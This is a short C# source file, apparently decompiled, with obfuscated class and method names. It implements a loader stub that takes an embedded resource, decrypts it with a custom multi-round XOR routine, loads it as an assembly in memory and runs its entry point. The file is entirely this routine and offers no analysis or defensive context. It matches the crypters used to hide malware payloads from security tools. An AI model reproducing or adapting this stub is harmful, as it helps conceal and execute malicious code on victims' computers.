using System.Reflection;
using System.Resources;
using System.Text;

namespace ns0;

internal sealed class Class0
{
	private static void Main()
	{
		ResourceManager resourceManager = new ResourceManager("res", Assembly.GetExecutingAssembly());
		resourceManager.ReleaseAllResources();
		Assembly.Load(smethod_0((byte[])resourceManager.GetObject("file"), "ռơƜƜռƀƜȮƀƆȮƔƑƣƉƑƥӂƎƔȄơƜƆƣ")).EntryPoint!.Invoke(null, null);
	}

	public static byte[] smethod_0(byte[] byte_0, string string_0)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(string_0);
		for (int num = 4; num >= 0; num--)
		{
			for (int i = 0; i < byte_0.Length; i++)
			{
				for (int j = 0; j < bytes.Length; j++)
				{
					byte_0[i] = (byte)(byte_0[i] ^ (((bytes[j] << num) ^ j) + i));
				}
				byte_0[i] = (byte)(byte_0[i] ^ bytes[i % bytes.Length]);
			}
		}
		return byte_0;
	}
}
